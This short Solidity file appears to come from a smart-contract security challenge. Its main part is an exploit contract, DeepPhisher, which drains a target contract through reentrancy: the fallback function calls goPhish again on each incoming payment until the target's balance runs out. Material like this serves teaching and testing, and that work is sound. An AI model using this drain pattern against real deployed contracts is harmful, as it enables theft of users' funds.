pragma solidity ^0.5.4;

contract BadPhishQuest{
    //....
    function step1Test(PhisherMan phisher, address hacker) internal returns (bool){
        return !phisher.sanityCheck();
    }
}

//exploiter
contract DeepPhisher{
    function() external payable{
        //if the next goPhish would cause contract to attempt to send more funds than available
        if(address(msg.sender).balance < msg.value){
            return;
        }
        PhisherMan s = PhisherMan(msg.sender);
        s.goPhish(address(this), 1);
    }
    function drain(PhisherMan phisher) external returns (uint256){
        phisher.goPhish(address(this), 1);
        return address(this).balance;
    }
    function depositTo(PhisherMan phisher) external payable{
        phisher.deposit.value(msg.value)();
    }
}

